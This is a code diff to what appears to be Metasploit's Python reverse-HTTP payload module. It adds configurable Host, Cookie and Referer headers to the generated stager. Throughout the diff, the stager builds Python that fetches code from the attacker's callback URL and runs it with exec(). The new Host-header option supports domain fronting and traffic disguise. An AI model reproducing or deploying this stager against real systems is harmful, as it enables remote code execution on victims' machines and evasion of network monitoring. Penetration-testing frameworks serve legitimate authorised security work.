@@ -14,7 +14,10 @@ module Payload::Python::ReverseHttp
     register_options(
       [
         OptString.new('PayloadProxyHost', [ false, "The proxy server's IP address" ]),
-        OptPort.new('PayloadProxyPort', [ true, "The proxy port to connect to", 8080 ])
+        OptPort.new('PayloadProxyPort', [ true, "The proxy port to connect to", 8080 ]),
+        OptString.new('HttpHeaderHost', [false, 'An optional value to use for the Host HTTP header']),
+        OptString.new('HttpHeaderCookie', [false, 'An optional value to use for the Cookie HTTP header']),
+        OptString.new('HttpHeaderReferer', [false, 'An optional value to use for the Referer HTTP header'])
       ], self.class)
   end
 
@@ -24,11 +27,14 @@ module Payload::Python::ReverseHttp
   def generate(opts={})
     ds = opts[:datastore] || datastore
     opts.merge!({
-      host:       ds['LHOST'] || '127.127.127.127',
-      port:       ds['LPORT'],
-      proxy_host: ds['PayloadProxyHost'],
-      proxy_port: ds['PayloadProxyPort'],
-      user_agent: ds['MeterpreterUserAgent']
+      host:           ds['LHOST'] || '127.127.127.127',
+      port:           ds['LPORT'],
+      proxy_host:     ds['PayloadProxyHost'],
+      proxy_port:     ds['PayloadProxyPort'],
+      user_agent:     ds['MeterpreterUserAgent'],
+      header_host:    ds['HttpHeaderHost'],
+      header_cookie:  ds['HttpHeaderCookie'],
+      header_referer: ds['HttpHeaderReferer']
     })
     opts[:scheme] = 'http' if opts[:scheme].nil?
 
@@ -104,9 +110,18 @@ module Payload::Python::ReverseHttp
       cmd << "hs.append(ul.ProxyHandler({'#{opts[:scheme]}':'#{var_escape.call(proxy_url)}'}))\n"
     end
 
+    headers = []
+    headers << "('User-Agent','#{var_escape.call(opts[:user_agent])}')"
+    headers << "('Cookie','#{var_escape.call(opts[:header_cookie])}')" if opts[:header_cookie]
+    headers << "('Referer','#{var_escape.call(opts[:header_referer])}')" if opts[:header_referer]
+
     cmd << "o=ul.build_opener(*hs)\n"
-    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(opts[:user_agent])}')]\n"
-    cmd << "exec(o.open('#{generate_callback_url(opts)}').read())\n"
+    cmd << "o.addheaders=[#{headers.join(',')}]\n"
+    if opts[:header_host]
+      cmd << "exec(o.open(ul.Request('#{generate_callback_url(opts)}',None,{'Host':'#{var_escape.call(opts[:header_host])}'})).read())\n"
+    else
+      cmd << "exec(o.open('#{generate_callback_url(opts)}').read())\n"
+    end
 
     py_create_exec_stub(cmd)
   end
